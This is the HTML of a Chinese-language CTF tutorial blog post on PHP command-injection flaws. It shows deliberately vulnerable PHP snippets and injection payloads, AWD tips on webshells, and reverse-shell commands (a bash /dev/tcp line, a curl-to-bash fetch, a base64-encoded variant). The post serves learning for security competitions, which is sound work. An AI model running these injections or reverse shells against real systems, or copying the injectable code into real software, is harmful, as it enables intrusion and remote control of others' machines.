@@ -1,0 +1,240 @@
+<html>
+<head>
+    <meta charset="utf-8"/>
+<meta name="description" content=""/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+<title>CTF WEB 命令执行漏洞 | Xing-Fax</title>
+
+<link rel="shortcut icon" href="https://Xing-Fax.GitHub.io/favicon.ico?v=1699016659770">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://Xing-Fax.GitHub.io/styles/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css">
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dart.min.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script>
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <div class="navbar-brand">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            Xing-Fax
+        </div>
+    </div>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+                <div class="nav-item">
+                    
+                        <a href="/" class="menu gt-a-link">
+                            首页
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/archives" class="menu gt-a-link">
+                            归档
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/tags" class="menu gt-a-link">
+                            标签
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/post/about" class="menu gt-a-link">
+                            关于
+                        </a>
+                    
+                </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1699016659770" action="/search/index.html">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    CTF WEB 命令执行漏洞
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2023-07-16 ·
+                    </time>
+                    
+                        <a href="https://Xing-Fax.GitHub.io/tag/php/" class="post-tags">
+                            # PHP
+                        </a>
+                    
+                        <a href="https://Xing-Fax.GitHub.io/tag/web/" class="post-tags">
+                            # WEB
+                        </a>
+                    
+                        <a href="https://Xing-Fax.GitHub.io/tag/ctf/" class="post-tags">
+                            # CTF
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="命令执行漏洞">命令执行漏洞</h1>
+ <!-- more --> 
+<p><strong>1. 程序过滤不严，导致用户可以将代码注入并执行</strong></p>
+<p>**高危函数：**eval()、assert()、preg_replace()、call_user_func()等等...</p>
+<p><strong>2. 对于执行命令的函数，参数过滤不严谨，导致直接命令执行</strong></p>
+<p>**高危函数：**system()、exec()、shell_exec()、passthru()、pctnl_exec()、popen()、proc_open()等等...</p>
+<blockquote>
+<p>反引号是shell_exec()的别名，如echo `ls` 代表执行ls命令</p>
+</blockquote>
+<pre><code class="language-php">&lt;?php
+    $username = $_GET['username'];
+	system(&quot;mkdir $username&quot;);
+?&gt;
+</code></pre>
+<p>正常情况下用户传入adc，系统就会执行“mkdir abc”命令，去创建一个文件夹</p>
+<p>但是如果传入参数为“abc;ls”，那么在创建文件夹后会执行&quot;ls&quot;命令，因为 ”;“ 分号为命令拼接，将两条命令放到一行当中去执行</p>
+<pre><code class="language-shell">cp /tmp/sourcefile /app/public/#{userinput}.png
+</code></pre>
+<p>如上述例子中通过传入&quot;abc.png;ls;&quot;，就会导致额外的命令执行</p>
+<h2 id="执行权限">执行权限</h2>
+<p>执行系统命令继承Web server用户权限，Web服务器用户为www-data</p>
+<p>在awd比赛中，通常会给你一个能够连接ssh的用户，例如ctf、test、user，如果别人给你服务器种上了木马，而你使用连接ssh的用户通常无法删除，因为所属用户组不同，因此没有权限</p>
+<p>通常解决方法为给自己服务器写入木马，然后通过蚁剑类远程执行命令工具来去删除对方木马</p>
+<p>另一种是不死马，不死马会在内存中不断运行，每间隔一段时间如一秒，向主机重新写入木马，解决方法为通过蚁剑连接到自己主机，执行”kill -9 -1“命令，结束当前用户所有的进程</p>
+<p>如果说是通过调用系统命令执行&quot;sh busima.sh&quot;、&quot;php busima.php&quot;等命令，可以通过执行</p>
+<pre><code class="language-shell">ps -ef | grep busima.sh
+</code></pre>
+<p>找到进程PID，然后通过&quot;kill -9 pid &lt;PID&gt;&quot;结束进程</p>
+<h2 id="例子">例子</h2>
+<pre><code class="language-php">&lt;?php
+    if(isset($_GET['ip'])){
+        $ip = $_GET['ip'];
+        echo shell_exec(&quot;ping - c 4&quot; . $ip);
+    } else{
+        highlight_file(__FILE__);
+    }
+?&gt;
+</code></pre>
+<blockquote>
+<p>PHP中的点'.'代表字符串拼接</p>
+</blockquote>
+<p>通过拼接命令参数，导致的额外命令执行，如执行“ls -l”命令</p>
+<p>GET:</p>
+<pre><code>http://localhost/test.php?ip=127.0.0.1;ls%20-l
+</code></pre>
+<h1 id="联合执行">联合执行</h1>
+<pre><code>cmd1;cmd2;cmd3
+</code></pre>
+<p>命令从头往后依次执行，无论前一条命令是否执行成功，都不会影响后面的命令执行</p>
+<pre><code>cmd1&amp;cmd2&amp;cmd3
+</code></pre>
+<p>使用逻辑和&amp;&amp;，如果前一条命令出现错误时，将会停止执行后面的命令</p>
+<pre><code>cmd1||cmd2||cmd3
+</code></pre>
+<p>使用逻辑或||，如果前一条命令执行失败，才会执行后面的命令</p>
+<pre><code>echo 'abc' | md5
+</code></pre>
+<p>使用管道符|，会将前一条命令的结果作为后一条命令的输入</p>
+<pre><code>%0a
+%0d
+</code></pre>
+<p>换行和回车符</p>
+<h1 id="无回显问题">无回显问题</h1>
+<p>通常在远程计算机执行命令后都会返回命令结果，但是也可能没有返回结果，也叫无回显</p>
+<h2 id="反弹shell">反弹shell</h2>
+<pre><code class="language-shell">nc -lvp &lt;port&gt;
+</code></pre>
+<p>在自己服务器中监听反弹的端口号</p>
+<pre><code class="language-shell">bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1
+</code></pre>
+<p>在远程计算机上执行如上命令，即可完成shell反弹</p>
+<p>此命令也有可能无法执行成功，可以将命令保存在自己服务器中的一个txt文档中，使用管道符来执行命令，如下</p>
+<pre><code class="language-shell">curl http://localhost/shell.txt | bash
+</code></pre>
+<p>也可以通过将命令进行base64编码来执行，如下</p>
+<pre><code class="language-shell">echo YmFzaCAtaSA+JiAvZGV2L3RjcC88aXA+Lzxwb3J0PiAwPiYx | base64 -d | bash
+</code></pre>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://Xing-Fax.GitHub.io/post/filter/" class="post-title gt-a-link">
+                    CTF WEB 绕过过滤
+                </a>
+            </div>
+        
+
+        
+
+        
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">温故而知新，可以为师矣~</div>
+    <div class="social-container">
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Website BY <a href="https://github.com/Xing-Fax/" target="_blank">Xing-Fax</a> Powered BY <a
+                href="https://github.com/Xing-Fax/xing-fax.github.io/" target="_blank">GitHub | <a href="https://xing-fax.github.io/atom.xml" target="_blank">RSS</a></a>
+    </div>
+</div>
+
+<script>
+  hljs.initHighlightingOnLoad()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
